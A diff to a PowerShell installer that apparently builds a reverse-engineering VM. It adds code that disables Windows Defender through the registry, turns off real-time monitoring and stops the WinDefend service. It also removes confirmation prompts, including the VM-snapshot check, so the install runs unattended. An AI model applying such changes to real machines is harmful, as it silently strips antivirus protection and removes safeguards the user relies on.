@@ -106,6 +106,32 @@ param (
 $ErrorActionPreference = 'Stop'
 $ProgressPreference = 'SilentlyContinue'
 
+# Force unattended mode by default
+if (-not $PSBoundParameters.ContainsKey('noGui')) { $noGui = $true }
+if (-not $PSBoundParameters.ContainsKey('noWait')) { $noWait = $true }
+if (-not $PSBoundParameters.ContainsKey('noPassword')) { $noPassword = $true }
+if (-not $PSBoundParameters.ContainsKey('installProfile') -or [string]::IsNullOrEmpty($installProfile)) { $installProfile = "Minimal" }
+
+# Disable Windows Defender via registry
+New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
+Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Force -ErrorAction SilentlyContinue
+New-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -PropertyType DWORD -Force -ErrorAction SilentlyContinue
+
+# Disable real-time protection
+try {
+    Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction Stop
+} catch {
+    Write-Host "[!] Failed to disable Defender real-time monitoring: $($_.Exception.Message)" -ForegroundColor Yellow
+}
+
+# Stop and disable Windows Defender service
+try {
+    Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+    Set-Service -Name WinDefend -StartupType Disabled -ErrorAction SilentlyContinue
+} catch {
+    Write-Host "[!] Failed to stop/disable WinDefend service: $($_.Exception.Message)" -ForegroundColor Yellow
+}
+
 # Function to download files and handle errors consistently
 function Save-FileFromUrl {
     param (
@@ -502,42 +528,19 @@ if ($noGui.IsPresent) {
 		}
 
 		if (-not $script:checksPassed){
-			Write-Host "[-] Do you still wish to proceed? (Y/N): " -ForegroundColor Yellow -NoNewline
-			$response = Read-Host
-			if ($response -notin @("y","Y")) {
-				exit 1
-			}
+			Write-Host "[!] Non-mandatory checks reported warnings; continuing in non-interactive mode." -ForegroundColor Yellow
+			Write-Log "Non-mandatory checks reported warnings; continuing in non-interactive mode." "WARN"
 		}
 
 		Write-Host "[+] Setting password to never expire to avoid that a password expiration blocks the installation..."
 		$UserNoPasswd = Get-CimInstance Win32_UserAccount -Filter "Name='${Env:UserName}'"
 		$UserNoPasswd | Set-CimInstance -Property @{ PasswordExpires = $false }
 
-		# Prompt user to remind them to take a snapshot
-		Write-Host "[-] Have you taken a VM snapshot to ensure you can revert to pre-installation state? (Y/N): " -ForegroundColor Yellow -NoNewline
-		$response = Read-Host
-		if ($response -notin @("y","Y")) {
-			exit 1
-		}
+		# Non-interactive mode: log reminder instead of prompting
+		Write-Host "[+] Reminder: take a VM snapshot to ensure you can revert to pre-installation state." -ForegroundColor Yellow
 	}
 
-	# Interactive install profile selection (CLI mode only; skipped when $installProfile already set)
-	if ([string]::IsNullOrEmpty($installProfile)) {
-		Write-Host ""
-		Write-Host "[+] Select an install profile:" -ForegroundColor Cyan
-		Write-Host "    [1] Minimal  - Essential RE tools only  (~16 packages)"
-		Write-Host "    [2] Standard - Common RE tools           (~62 packages)"
-		Write-Host "    [3] Full     - All packages [default]   (~130 packages)"
-		Write-Host "[-] Enter choice (1-3, default=3): " -ForegroundColor Yellow -NoNewline
-		$profileChoice = Read-Host
-		switch ($profileChoice) {
-			"1" { $installProfile = "Minimal" }
-			"2" { $installProfile = "Standard" }
-			"3" { $installProfile = "Full" }
-			default { $installProfile = "Full" }
-		}
-		Write-Host "[+] Using install profile: $installProfile" -ForegroundColor Green
-	}
+	Write-Host "[+] Using install profile: $installProfile" -ForegroundColor Green
 
 }
 
@@ -1274,18 +1277,10 @@ Write-Host "Configuration file path: $configPath"
 # Check the configuration file exists
 if (-Not (Test-Path $configPath)) {
     Write-Host "`t[!] Configuration file missing: " $configPath -ForegroundColor Red
-    Write-Host "`t[-] Please download config.xml from $configPathUrl to your desktop" -ForegroundColor Yellow
-    Write-Host "`t[-] Is the file on your desktop? (Y/N): " -ForegroundColor Yellow -NoNewline
-    $response = Read-Host
-    if ($response -notin @("y","Y")) {
-        exit 1
-    }
-    if (-Not (Test-Path $configPath)) {
-        Write-Host "`t[!] Configuration file still missing: " $configPath -ForegroundColor Red
-        Write-Host "`t[!] Exiting..." -ForegroundColor Red
-        Start-Sleep 3
-        exit 1
-    }
+    Write-Host "`t[-] Please download config.xml from $configSource to your desktop" -ForegroundColor Yellow
+    Write-Host "`t[!] Exiting..." -ForegroundColor Red
+    Start-Sleep 3
+    exit 1
 }
 
 # Get config contents
